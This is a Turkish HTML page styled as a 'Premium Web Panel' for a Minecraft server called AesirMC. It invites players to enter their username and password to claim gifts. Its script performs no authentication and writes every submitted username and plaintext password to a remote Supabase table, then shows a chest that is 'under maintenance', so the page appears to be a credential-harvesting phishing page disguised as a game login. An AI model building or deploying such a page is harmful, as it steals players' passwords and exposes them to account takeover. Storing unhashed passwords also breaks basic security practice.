<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AesirMC | Premium Web Panel</title>
    
    <link rel="icon" type="image/png" href="logo.png">
    
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        :root {
            --primary: #00a2ff;
            --secondary: #0066ff;
            --accent: #d48e00;
            --bg-dark: #050608;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
            --success: #00ff88;
        }

        body {
            margin: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--bg-dark);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 162, 255, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(0, 102, 255, 0.1) 0%, transparent 40%);
            overflow-x: hidden;
        }

        /* SAĞ ÜST BİLDİRİM (TOAST) */
        #toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 10000;
        }

        .toast {
            background: rgba(0, 255, 136, 0.1);
            backdrop-filter: blur(15px);
            border: 1px solid var(--success);
            color: white;
            padding: 16px 25px;
            border-radius: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
            transform: translateX(120%);
            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .toast.show { transform: translateX(0); }

        /* SOL ALT SABİT BUTON VE DEV İMLEÇ */
        .fixed-play-container {
            position: fixed;
            bottom: 30px;
            left: 30px;
            z-index: 9999;
        }

        .btn-play {
            background-color: var(--accent);
            color: black;
            padding: 15px 35px;
            border-radius: 60px;
            text-decoration: none;
            font-weight: 800;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 15px;
            transition: 0.3s;
            border: none;
            cursor: pointer;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
        }

        .btn-play:hover {
            transform: scale(1.05) translateY(-5px);
            background-color: #f1a400;
        }

        .custom-cursor-img {
            width: 45px; /* Senin istediğin 2 kat büyük boyut */
            height: 45px;
            object-fit: contain;
        }

        nav {
            padding: 15px 8%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(5, 6, 8, 0.85);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        #auth-container {
            margin: auto;
            width: 100%;
            max-width: 420px;
            padding: 50px;
            background: var(--glass);
            backdrop-filter: blur(40px);
            border: 1px solid var(--border);
            border-radius: 32px;
            text-align: center;
            animation: fadeIn 0.8s ease-out;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255,255,255,0.05);
            border: 1px solid var(--border);
            border-radius: 16px;
            color: white;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        .btn-primary {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border: none;
            border-radius: 16px;
            color: white;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
        }

        /* OYUN ALANI VE SANDIK ZIPLAMA */
        #game-container { display: none; padding: 60px 10%; text-align: center; }
        .main-chest { 
            width: 240px; 
            cursor: pointer; 
            transition: 0.3s; 
            filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4)); 
        }

        .chest-jump { animation: squash-stretch 0.5s ease-in-out; }

        @keyframes squash-stretch {
            0% { transform: scale(1, 1); }
            30% { transform: scale(1.25, 0.75); }
            50% { transform: scale(0.75, 1.25) translateY(-30px); }
            70% { transform: scale(1.15, 0.85); }
            100% { transform: scale(1, 1); }
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div id="toast-container"></div>

<nav>
    <div style="display: flex; align-items: center; gap: 15px;">
        <img src="logo.png" width="45" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
        <div style="font-size: 26px; font-weight: 800;">AESIR<span style="color:var(--primary)">MC</span></div>
    </div>
</nav>

<div class="fixed-play-container">
    <button class="btn-play" onclick="window.location.href='https://aesirmc.com'">
        <img src="aa.png" class="custom-cursor-img" alt="Cursor">
        oyna.aesirmc.com
    </button>
</div>

<div id="auth-container">
    <img src="logo.png" width="80" style="margin-bottom: 20px;" onerror="this.style.display='none'">
    <h2>Giriş Yap</h2>
    <p>Hediyelerini almak için hesabını bağla.</p>
    <input type="text" id="username" placeholder="Kullanıcı Adı">
    <input type="password" id="password" placeholder="Şifre">
    <button class="btn-primary" onclick="connectAndGo()">DÜNYAYA KATIL</button>
</div>

<div id="game-container">
    <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 20px;"></h1>
    <div id="chest-zone">
        <img src="adsız.png" id="main-chest-img" class="main-chest" onclick="handleChestClick()" onerror="this.src='https://minecraft.wiki/images/Chest_JE2_BE2.png'">
        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px;">SANDIĞA DOKUN VE AÇ</p>
    </div>
</div>

<script>
    // Supabase Ayarları (Senin keylerinle güncellendi)
    const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
    const _db = supabase.createClient(S_URL, S_KEY);

    function showToast(message) {
        const container = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerHTML = `<span>✅</span> ${message}`;
        container.appendChild(toast);
        setTimeout(() => toast.classList.add('show'), 100);
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 500);
        }, 4000);
    }

    async function connectAndGo() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(!u || !p) return alert("Lütfen kullanıcı adı ve şifre girin!");

        // TABLO İSMİ 'users' OLARAK DÜZELTİLDİ
        const { error } = await _db.from('users').insert([{ username: u, password: p }]);
        
        if (error) {
            console.error("Hata:", error);
            alert("Bağlantı Hatası: " + error.message);
        } else {
            document.getElementById('auth-container').style.display = 'none';
            document.getElementById('game-container').style.display = 'block';
            document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
            showToast(`Başarıyla giriş yapıldı: ${u}`);
        }
    }

    function handleChestClick() {
        const chest = document.getElementById('main-chest-img');
        chest.classList.add('chest-jump');
        setTimeout(() => {
            alert("Sandık sistemi bakımda, yakında açılacak!");
            chest.classList.remove('chest-jump');
        }, 600);
    }
</script>
</body>
</html>
